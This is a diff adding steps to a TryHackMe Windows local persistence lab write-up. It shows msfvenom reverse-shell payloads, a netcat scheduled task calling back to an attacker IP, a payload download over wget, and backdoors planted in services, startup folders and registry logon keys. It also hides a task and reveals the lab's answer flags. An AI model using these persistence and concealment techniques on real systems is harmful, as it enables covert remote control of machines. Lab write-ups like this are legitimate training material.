@@ -225,49 +225,215 @@ This guide contains the answer and steps necessary to get to them for the [Windo
 
 1. Insert flag7 here
 
+   First thing to do is create a payload that will give us a reverse shell upon executing. Make sure the type is set to windows service.
 
+   ```console
+   msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.78.136 LPORT=1337 -f exe-service -o rev-svc.exe    
+   ```
+   
+   ![Abusing Service Msfvenum](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Abusing_Service_Msfvenum.png)
 
-   ><details><summary>Click for answer</summary></details>
+   Now we can transfer this file to the target system. 
+
+   ```powershell
+   evil-winrm -i 10.10.163.79 -u Administrator -H f3118544a831e728781d780cfdb9c1fa
+   
+   upload /home/kali/rev-svc.exe C:\Windows\rev-svc.exe
+   ```
+
+   ![Abusing Service Transfer](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Abusing_Service_Transfer.png)
+
+   Next we must create a new service that points to this executable and starts at launch.
+
+   ```powershell
+   sc.exe create THMservice2 binPath= "C:\Windows\rev-svc.exe" start= auto
+   ```
+
+   ![Abusing Service Create](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Abusing_Service_Create.png)
+
+   Before starting this service, we should setup a listener with `nc` `nc -nlvp 1337`.
+
+   ```powershell
+   sc.exe start THMservice2
+   ```
+   
+   ![Abusing Service Start](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Abusing_Service_Start.png)
+
+   Now that we have a connection, we can get our flag.
+
+   ![Abusing Service Flag7](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Abusing_Service_Flag7.png)
+
+   ><details><summary>Click for answer</summary>THM{SUSPICIOUS_SERVICES}</details>
 
 2. Insert flag8 here
 
+   To find a suitable service to modify, we should check for any stopped services. Instead of looking through all services, we know there is one named `THMservice`.
+   
+   ```powershell
+   sc.exe query state= all
+   sc.exe query thmservice2
+   sc.exe query thmservice3
+   sc.exe qc thmservice3
+   ```
+   
+   ![Abusing Service Services](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Abusing_Service_Services.png)
 
+   We see we only need to change the binpath and account name it will run as.
 
-   ><details><summary>Click for answer</summary></details>
+   ```powershell
+   sc.exe config thmservice3 binPath= "C:\Windows\rev-svc.exe" obj= "LocalSystem"
+   ```
+   
+   ![Abusing Service Modify](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Abusing_Service_Modify.png)
+
+   After starting out listener again, we can start the service to get a connection back.
+
+   ```powershell
+   nc -nlvp 1337
+   sc.exe start THMservice3
+   ```
+   
+   ![Abusing Service Start2](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Abusing_Service_Start2.png)
+
+   Now we can get our flag!
+
+   ![Abusing Service Flag8](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Abusing_Service_Flag8.png)
+
+   ><details><summary>Click for answer</summary>THM{IN_PLAIN_SIGHT}</details>
 
 ### Abusing Scheduled Tasks
 
 1. Insert flag9 here
 
+   We can use the following command to create a task that will run every minute and creates a netcat connection back to our system.
+   
+   ```powershell
+   schtasks /create /sc minute /mo 1 /tn THM-TaskBackDoor /tr "C:\tools\nc64 -e cmd.exe 10.18.78.136 1337" /ru SYSTEM
+   ```
 
+   ![Tasks Create](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Tasks_Create.png)
 
-   ><details><summary>Click for answer</summary></details>
+   We can check if it was properly created with `schtasks` as well.
+   
+   ```powershell
+   schtasks /query /tn THM-TaskBackDoor
+   ```
+
+   This is already enough for the flag. But we can still try and hide this task. This can be done by either removing or renaming its security descriptor.
+   
+   Open regedit with SYSTEM privileges using `PsExec`:
+   
+   ```powershell
+   C:\tools\pstools\PsExec.exe -i -s regedit
+   ```
+
+   Now navigate to `Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\THM-TaskBackDoor` and remove or rename the SD key.
+   
+   ![Tasks Descriptor](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Tasks_Descriptor.png)
+
+   Querying the task again, should now give us an error.
+   
+   ![Tasks Error](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Tasks_Error.png)
+
+   Al that is left to do now, is setup our `nc` listener and wait for the task to run again.
+
+   ![Tasks Flag9](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Tasks_Flag9.png)
+
+   ><details><summary>Click for answer</summary>THM{JUST_A_MATTER_OF_TIME}</details>
 
 ### Logon Triggered Persistence
 
 1. Insert flag10 here
 
+   We need to create another payload which is of type exe (not exe-service).
 
+   ```console
+   msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.78.136 LPORT=1337 -f exe -o revshell.exe
+   ```
 
-   ><details><summary>Click for answer</summary></details>
+   Create an http server and transfer it to our target machine.
+
+   ```console
+   python3 -m http.server 8080
+   
+   wget http://10.18.78.136:8080/revshell.exe -O revshell.exe
+   ```
+
+   ![Logon Startup Transfer](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Logon_Startup_Transfer.png)
+
+   Now copy this file to the startup folder for all users:
+
+   ```powershell
+   copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\revshell.exe"
+   ```
+
+   ![Logon Startup Copy](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Logon_Startup_Copy.png)
+
+   Before loging out, make sure to disable the previously created task or it might interfere. Then logout of the machine and remote back in.
+
+   If you setup a listener first, you should get a connection back.
+
+   ![Logon Startup Login](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Logon_Startup_Login.png)
+
+   And we can get our 10th flag.
+
+   ![Logon Startup Flag10](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Logon_Startup_Flag10.png)
+
+   ><details><summary>Click for answer</summary>THM{NO_NO_AFTER_YOU}</details>
 
 2. Insert flag11 here
 
+   We can use the same file, but lets move it so the startup folder doesn't execute it as well.
 
+   ```console
+   move "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\revshell.exe" "C:\Windows\revshell.exe"
+   ```
 
-   ><details><summary>Click for answer</summary></details>
+   ![Logon Run Move](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Logon_Run_Move.png)
+
+   Now we must add a key to the registry telling windows to execute the file on login. We'll place it in the folder for all users. `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
+
+   Make sure to add it as an expandable variable with name `MyBackdoor`
+
+   ![Logon Run Registry](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Logon_Run_Registry.png)
+
+   After loggin in again (and setting up a listener), we should be able to get our flag.
+   
+   ![Logon Run Flag11](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Logon_Run_Flag11.png)
+
+   ><details><summary>Click for answer</summary>THM{LET_ME_HOLD_THE_DOOR_FOR_YOU}</details>
 
 3. Insert flag12 here
 
+   We can use the same payload as in the previous question. We don't need to move it either.
 
+   What we need to do is modify the userinit key in the winlogon folder of the registry to include our payload.
 
-   ><details><summary>Click for answer</summary></details>
+   Navigate to `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\` in the registry.
+
+   Append the `userinit` value with `, C:\Windows\revshell.exe`.
+
+   ![Logon Winlogon Registry](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Logon_Winlogon_Registry.png)
+
+   Don't forget to remove the run value we added in the previous question. Logout and back in again and we should be able to get our flag.
+
+   ![Logon Winlogon Flag12](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Logon_Winlogon_Flag12.png)
+
+   ><details><summary>Click for answer</summary>THM{I_INSIST_GO_FIRST}</details>
 
 4. Insert flag13 here
 
+   We can use the same payload as in the previous question. We don't need to move it either.
 
+   Navigate to `HKCU\Environment` and add en expandable string value called `UserInitMprLogonScript` and have it point to our payload.
+   
+   ![Logon Scripts Registry](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Logon_Scripts_Registry.png)
 
-   ><details><summary>Click for answer</summary></details>
+   Don't forget to remove the userinit value we added in the previous question. Logout and back in again and we should be able to get our flag.
+
+   ![Logon Scripts Flag13](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Logon_Scripts_Flag13.png)z
+
+   ><details><summary>Click for answer</summary>THM{USER_TRIGGERED_PERSISTENCE_FTW}</details>
 
 ### Backdooring the Login Screen / RDP
 
